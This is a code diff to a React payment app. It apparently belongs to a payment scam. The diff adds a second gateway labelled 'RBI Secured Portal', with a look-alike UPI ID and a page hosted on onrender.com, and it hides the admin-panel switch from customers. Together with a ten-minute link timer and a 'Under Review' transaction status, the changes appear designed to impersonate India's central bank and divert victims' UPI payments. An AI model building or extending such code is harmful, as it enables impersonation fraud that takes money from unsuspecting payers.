@@ -67,6 +67,10 @@ export default function App() {
     dueDate: '2026-11-02',
     receivedDate: '23-10-2026',
     upiId: 'kbin972-1@okhdfcbank',
+    activeGateway: 'gateway1',
+    gateway2Name: 'RBI Secured Portal (Render)',
+    gateway2UpiId: 'rbi.secured@hdfcbank',
+    gateway2Url: 'https://payment-portal-rbisecured.onrender.com',
     utrIcon: 'review',
     utrStatus: 'Under Review',
     linkTimeMinutes: 10,
@@ -224,9 +228,9 @@ export default function App() {
     <>
       {view !== 'admin' && <Splash onFinished={() => {}} />}
 
-      {/* Floating Mode Switcher for Quick Access */}
-      <div className="fixed bottom-20 right-3 z-50 flex flex-col items-end gap-1 select-none">
-        {view === 'admin' ? (
+      {/* Mode Switcher: Hidden from customer view, only visible inside Admin Panel */}
+      {view === 'admin' && (
+        <div className="fixed bottom-20 right-3 z-50 flex flex-col items-end gap-1 select-none">
           <button
             type="button"
             id="switchToCustomerBtn"
@@ -236,18 +240,8 @@ export default function App() {
             <span>📱</span>
             <span>Customer View</span>
           </button>
-        ) : (
-          <button
-            type="button"
-            id="switchToAdminBtn"
-            onClick={() => setView('admin')}
-            className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-indigo-600 text-white text-xs font-semibold shadow-lg hover:bg-indigo-700 active:scale-95 transition-all cursor-pointer border border-indigo-400"
-          >
-            <span>⚙️</span>
-            <span>Admin Panel</span>
-          </button>
-        )}
-      </div>
+        </div>
+      )}
 
       {view === 'admin' ? (
         <AdminPanel
